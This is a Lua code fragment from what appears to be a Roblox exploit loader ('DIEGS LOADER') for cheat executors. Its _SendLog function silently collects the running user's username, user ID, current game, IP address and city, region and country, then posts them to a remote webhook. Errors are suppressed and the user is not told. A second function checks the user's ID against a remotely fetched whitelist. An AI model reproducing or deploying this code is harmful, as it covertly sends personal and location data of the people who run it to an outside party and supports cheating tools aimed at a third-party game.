local function _SendLog(wl)
    local ok, gName = pcall(function() return _M:GetProductInfo(game.PlaceId).Name end)
    gName = ok and gName or "Unknown Game"
    local loc = _GetLoc()
    local msg = string.format(
        "**[DIEGS LOADER] New User**\nUsername: `%s`\nUserId: `%d`\nGame: `%s`\nPlaceId: `%d`\nStatus: `%s`\nIP: `%s`\nLocation: `%s, %s, %s`\nTime: <t:%d:F>",
        _LP.Name, _LP.UserId, gName, game.PlaceId, wl and "WHITELISTED" or "NOT WHITELISTED", loc.ip, loc.city, loc.region, loc.country, os.time()
    )
    local json = _H:JSONEncode({content = msg})
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function() req({Url = _WURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json}) end)
    else
        pcall(function() _H:PostAsync(_WURL, json) end)
    end
end

local function _CheckWL()
    local ok, res = pcall(function() return game:HttpGet(_STRS[6] .. "?t=" .. tostring(os.time())) end)
    if not ok or not res then return false end
    local myId = tostring(_LP.UserId)
    local jsonOk, data = pcall(function() return _H:JSONDecode(res) end)
    if jsonOk and type(data) == "table" then
        local list = data.whitelist or data
        for _, id in pairs(list) do
            if type(id) ~= "table" and tostring(id) == myId then return true end
        end
    else
        for line in string.gmatch(res, "[^\r\n]+") do
            if line:match("^%s*(.-)%s*$") == myId then return true end
        end
    end
    return false
end

